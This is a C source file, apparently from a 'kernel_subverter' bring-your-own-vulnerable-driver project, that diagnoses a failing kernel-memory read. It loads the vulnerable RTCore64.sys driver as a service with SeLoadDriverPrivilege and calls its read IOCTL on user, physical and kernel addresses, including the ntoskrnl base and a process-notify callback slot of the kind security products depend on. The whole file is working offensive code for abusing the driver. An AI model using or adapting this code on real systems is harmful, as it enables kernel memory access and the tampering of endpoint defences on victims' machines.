/*
 * rtcore64_probe.c -- RTCore64.sys diagnostic probe
 * byovd/kernel_subverter/rtcore64_probe.c
 *
 * Determines WHY error=87 fires by testing:
 *   1. Multiple struct layouts (Offset=0 vs Offset=4 vs Size field variants)
 *   2. User-space VA vs kernel VA vs low PA
 *   3. Different IOCTL buffer sizes
 *
 * Build:
 *   clang rtcore64_probe.c -o rtcore64_probe.exe -lkernel32 -ladvapi32
 *
 * Run as Admin:
 *   .\rtcore64_probe.exe ..\..\RTCore64.sys
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

#define RTCORE64_SVC_NAME    "RTCore64"
#define RTCORE64_DEVICE      "\\\\.\\RTCore64"
#define RTCORE64_IOCTL_READ  0x80002048UL
#define RTCORE64_IOCTL_WRITE 0x8000204CUL

/* ── service load/unload ─────────────────────────────────────────────────── */

static BOOL svc_load(const char *abs_path) {
    char nt[MAX_PATH+8] = {0};
    snprintf(nt, sizeof(nt)-1, "\\??\\%s", abs_path);

    SC_HANDLE hScm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!hScm) return FALSE;

    SC_HANDLE hStale = OpenServiceA(hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hStale) {
        SERVICE_STATUS ss={0};
        ControlService(hStale, SERVICE_CONTROL_STOP, &ss);
        Sleep(300); DeleteService(hStale); CloseServiceHandle(hStale); Sleep(300);
    }

    SC_HANDLE hSvc = CreateServiceA(hScm, RTCORE64_SVC_NAME, RTCORE64_SVC_NAME,
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, nt, NULL,NULL,NULL,NULL,NULL);
    if (!hSvc) { CloseServiceHandle(hScm); return FALSE; }

    BOOL ok = StartServiceA(hSvc,0,NULL);
    if (!ok && GetLastError()==ERROR_SERVICE_ALREADY_RUNNING) ok=TRUE;
    CloseServiceHandle(hSvc); CloseServiceHandle(hScm);
    if (ok) Sleep(400);
    return ok;
}

static void svc_unload(void) {
    SC_HANDLE hScm = OpenSCManagerA(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    if (!hScm) return;
    SC_HANDLE hSvc = OpenServiceA(hScm, RTCORE64_SVC_NAME, SERVICE_ALL_ACCESS);
    if (hSvc) {
        SERVICE_STATUS ss={0};
        ControlService(hSvc,SERVICE_CONTROL_STOP,&ss);
        Sleep(200); DeleteService(hSvc); CloseServiceHandle(hSvc);
    }
    CloseServiceHandle(hScm);
}

/* ── raw IOCTL probe ────────────────────────────────────────────────────── */

static void probe_ioctl(HANDLE dev, uint64_t addr,
                         uint32_t field_14,   /* the mystery field at +0x14 */
                         const char *label)
{
    /* layout A: Barakat / standard 32-byte struct */
#pragma pack(push,1)
    struct {
        uint8_t  pad[8];    /* +0x00 */
        uint64_t address;   /* +0x08 */
        uint32_t pad2;      /* +0x10 */
        uint32_t f14;       /* +0x14 -- the field we're testing */
        uint32_t value;     /* +0x18 */
        uint32_t pad3;      /* +0x1C */
    } op = {0};
#pragma pack(pop)

    op.address = addr;
    op.f14     = field_14;

    DWORD ret = 0;
    BOOL  ok  = DeviceIoControl(dev, RTCORE64_IOCTL_READ,
                                  &op, sizeof(op),
                                  &op, sizeof(op),
                                  &ret, NULL);
    DWORD err = GetLastError();

    printf("  %-50s  %s  val=0x%08X  err=%lu\n",
           label,
           ok ? "OK  " : "FAIL",
           op.value,
           ok ? 0 : err);
}

int main(int argc, char **argv) {
    const char *driver_path = ".\\..\\..\\RTCore64.sys";
    if (argc > 1) driver_path = argv[1];

    char abs[MAX_PATH] = {0};
    GetFullPathNameA(driver_path, MAX_PATH, abs, NULL);

    printf("\n[*] RTCore64 IOCTL probe -- isolating error=87\n");
    printf("[*] driver: %s\n\n", abs);

    /* privilege */
    HANDLE ht = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY, &ht);
    LUID luid; LookupPrivilegeValueA(NULL,"SeLoadDriverPrivilege",&luid);
    TOKEN_PRIVILEGES tp={1,{{luid,SE_PRIVILEGE_ENABLED}}};
    AdjustTokenPrivileges(ht,FALSE,&tp,sizeof(tp),NULL,NULL);
    CloseHandle(ht);

    if (!svc_load(abs)) { printf("[-] driver load failed\n"); return 1; }

    HANDLE dev = CreateFileA(RTCORE64_DEVICE,
                              GENERIC_READ|GENERIC_WRITE,
                              0,NULL,OPEN_EXISTING,
                              FILE_ATTRIBUTE_NORMAL,NULL);
    if (dev == INVALID_HANDLE_VALUE) {
        printf("[-] device open failed: %lu\n", GetLastError());
        svc_unload(); return 1;
    }
    printf("[+] device handle: %p\n\n", (void*)dev);

    /*
     * Test matrix:
     * Vary the address type AND the mystery field at +0x14.
     *
     * If error changes based on ADDRESS -> VA range check in driver
     * If error changes based on FIELD   -> field interpretation issue
     * If error=87 on ALL -> struct size or IOCTL code wrong
     * If error=31 on any -> struct OK, address just not mapped (normal)
     * If OK on any       -> that combination works!
     */

    printf("=== ADDRESS TYPE TEST (field_14 = 0) ===\n");
    printf("  %-50s  %-6s  %-12s  %s\n","label","result","value","error");
    printf("  %-50s  %-6s  %-12s  %s\n","-----","------","-----","-----");

    /* user-space stack address -- should always be accessible */
    uint32_t stack_canary = 0xDEADBEEF;
    probe_ioctl(dev, (uint64_t)(uintptr_t)&stack_canary, 0,
                "user VA (our stack) f14=0");

    /* user-space heap */
    void *heap = malloc(16);
    *(uint32_t*)heap = 0xCAFEBABE;
    probe_ioctl(dev, (uint64_t)(uintptr_t)heap, 0,
                "user VA (heap) f14=0");
    free(heap);

    /* low physical -- identity mapped on most systems */
    probe_ioctl(dev, 0x1000ULL, 0,
                "PA 0x1000 (low phys) f14=0");
    probe_ioctl(dev, 0x7FFE0000ULL, 0,
                "KUSER_SHARED_DATA-ish PA f14=0");

    /* kernel VA range */
    probe_ioctl(dev, 0xFFFFF800DE9B3D40ULL, 0,
                "kernel VA PspCRN slot[00] f14=0");
    probe_ioctl(dev, 0xFFFFF800DDC00000ULL, 0,
                "kernel VA ntoskrnl base f14=0");

    printf("\n=== FIELD_14 VARIATION TEST (kernel VA fixed) ===\n");
    printf("  %-50s  %-6s  %-12s  %s\n","label","result","value","error");
    uint64_t kva = 0xFFFFF800DE9B3D40ULL;
    for (uint32_t f = 0; f <= 8; f++) {
        char label[64];
        snprintf(label, sizeof(label), "KVA=0xFFFFF800DE9B3D40 f14=%u", f);
        probe_ioctl(dev, kva, f, label);
    }

    printf("\n=== BUFFER SIZE VARIATION TEST ===\n");
    printf("Trying different InputBufferLength with kernel VA, f14=0:\n");

    /* some builds check exact buffer size */
#pragma pack(push,1)
    struct {
        uint8_t  pad[8];
        uint64_t address;
        uint32_t pad2;
        uint32_t f14;
        uint32_t value;
        uint32_t pad3;
    } op32 = {.address=kva, .f14=0};
#pragma pack(pop)

    DWORD ret=0; BOOL ok;
    uint32_t val=0;

    /* test sizes: 24, 28, 32, 36 bytes */
    for (DWORD sz = 24; sz <= 36; sz += 4) {
        ok = DeviceIoControl(dev, RTCORE64_IOCTL_READ,
                              &op32, sz, &op32, sz, &ret, NULL);
        DWORD err = GetLastError();
        printf("  inSize=outSize=%-4lu  %s  err=%lu\n",
               sz, ok?"OK":"FAIL", ok?0:err);
    }

    /* test: different in vs out sizes */
    printf("\nMixed in/out sizes:\n");
    for (DWORD insz = 24; insz <= 36; insz += 4) {
        for (DWORD outsz = 24; outsz <= 36; outsz += 4) {
            if (insz == outsz) continue;
            memset(&op32, 0, sizeof(op32));
            op32.address = kva;
            ok = DeviceIoControl(dev, RTCORE64_IOCTL_READ,
                                  &op32, insz, &op32, outsz, &ret, NULL);
            DWORD err = GetLastError();
            if (ok || err != 87) { /* only print non-87 results */
                printf("  in=%lu out=%lu  %s  err=%lu  val=0x%08X\n",
                       insz, outsz,
                       ok?"OK":"FAIL",
                       ok?0:err,
                       op32.value);
            }
        }
    }

    printf("\n=== SUMMARY ===\n");
    printf("error=87 on user VA    -> struct layout wrong (field sizes/offsets)\n");
    printf("error=31 on user VA    -> struct OK, VA range check blocks kernel only\n");
    printf("OK or non-87 on user VA -> struct OK on some combination above\n");

    CloseHandle(dev);
    svc_unload();
    printf("\n[*] probe complete\n");
    return 0;
}